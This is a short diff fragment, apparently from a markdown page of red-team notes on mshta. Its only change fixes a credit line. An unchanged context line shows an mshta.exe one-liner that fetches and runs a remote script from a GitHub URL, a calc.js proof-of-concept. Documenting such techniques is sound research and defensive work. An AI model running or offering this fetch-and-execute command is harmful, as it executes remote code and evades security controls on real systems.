@@ -16,4 +16,4 @@ mshta
 `mshta.exe javascript:GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js");close();`
 
 
-<br><br>ads method suggested by @@yeyint_mth
+<br><br>ads method suggested by @yeyint_mth
